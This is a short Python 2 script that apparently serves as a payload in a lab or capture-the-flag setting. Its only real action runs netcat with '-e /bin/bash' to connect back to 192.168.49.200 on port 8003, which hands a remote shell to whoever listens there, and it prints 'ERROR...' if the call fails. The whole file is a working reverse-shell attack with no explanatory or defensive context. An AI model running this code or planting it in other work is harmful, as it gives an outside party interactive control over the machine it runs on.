#!/usr/bin/env python
import os
import sys
try:
        os.system('nc -e /bin/bash 192.168.49.200 8003')
except:
        print 'ERROR...'
sys.exit(0)
